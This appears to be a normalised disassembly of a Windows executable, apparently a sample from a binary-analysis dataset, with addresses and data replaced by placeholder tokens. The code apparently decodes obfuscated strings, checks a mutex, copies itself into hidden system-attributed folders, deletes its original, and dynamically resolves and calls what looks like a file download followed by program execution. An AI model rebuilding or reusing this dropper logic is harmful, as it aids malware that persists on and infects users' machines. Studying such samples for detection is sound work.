sub_401000
push ebp
mov ebp esp
sub esp 0x700
push ebx
push esi
push edi
nop
nop
nop
nop
nop
nop
nop
nop
mov edi rw-data
push edi
call sub_40135b
mov [ esp ] rw-data
call sub_40135b
mov esi rw-data
push esi
call sub_40135b
push rw-data
call sub_40135b
push rw-data
call sub_40135b
mov ebx rw-data
push ebx
call sub_40135b
push rw-data
call sub_40135b
push rw-data
call sub_40135b
push rw-data
call sub_40135b
add esp 0x20
call sub_401405
test eax eax
jne r-xdata
push 0x7
lea eax [ ebp - 0x500 ]
push 0x200
push eax
call sub_40136e
lea eax [ ebp - 0x500 ]
push ebx
push eax
call strcat
push rw-data
push esi
call strcat
lea eax [ ebp - 0x300 ]
push esi
push eax
call strcpy
push rw-data
push esi
call strcat
add esp 0x2c
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
and [ ebp + eax - 0x100 ] 0x0
lea eax [ ebp - 0x100 ]
push esi
push eax
call [ lstrcmpiA@IAT ]
mov ebx [ DeleteFileA@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov esi [ Sleep@IAT ]
push 0x3e8
call esi
push [ ebp + 0x10 ]
call ebx
lea eax [ ebp - 0x200 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
push rw-data
push edi
call strcat
add esp 0x10
push 0xea60
call esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
xor ecx ecx
lea edx [ ebp - 0x200 ]
push ecx
push ecx
push edx
push edi
push ecx
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x300 ]
push eax
call sub_40124f
pop ecx
push 0x0
push esi
call [ SetFileAttributesA@IAT ]
push esi
call ebx
push 0x0
lea eax [ ebp - 0x100 ]
push esi
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x500 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
xor eax eax
push 0x7530
call esi
lea eax [ ebp - 0x200 ]
push eax
call sub_401270
pop ecx
lea eax [ ebp - 0x500 ]
push eax
call ebx
lea eax [ ebp - 0x700 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x700 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x700 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x700 ]
push eax
call strcat
lea eax [ ebp - 0x700 ]
push eax
call sub_401270
add esp 0x24
push 0x1
call [ ExitProcess@IAT ]
lea eax [ ebp - 0x500 ]
push 0x0
push eax
lea eax [ ebp - 0x100 ]
push eax
call [ CopyFileA@IAT ]
sub_40124f
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_401270
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push edi
push rw-data
mov [ rw-data ] 0x4b
mov [ rw-data ] 0x43
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov edi eax
call [ FreeLibrary@IAT ]
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] 0x5
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call edi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_40136e
push ebp
mov ebp esp
sub esp 0x10c
lea eax [ ebp - 0x4 ]
push esi
push eax
call [ SHGetMalloc@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push 0x0
call [ SHGetSpecialFolderLocation@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x8 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
lea eax [ ebp - 0x10c ]
push eax
call strlen
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
inc eax
pop ecx
cmp [ ebp + 0xc ] eax
pop ecx
jae r-xdata
lea eax [ ebp - 0x10c ]
push eax
push [ ebp + 0x8 ]
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
pop esi
leave
retn
sub_401405
push esi
mov esi [ OpenMutexA@IAT ]
push edi
push rw-data
mov edi 0x1f0001
push 0x0
push edi
call esi
test eax eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
push rw-data
push eax
push edi
call esi
test eax eax
je r-xdata
pop edi
pop esi
retn
push 0x1
pop eax
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4015d5
cmp [ rw-data ] ebx
jne r-xdata
call sub_4015c0
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4015d2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40135b
mov eax [ esp + 0x4 ]
retn
sub cl 0x4
mov [ eax ] cl
inc eax
jmp r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
strcpy
jmp [ strcpy@IAT ]
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
strlen
jmp [ strlen@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4015c0
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4015d2
xor eax eax
retn
sub_4015d5
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
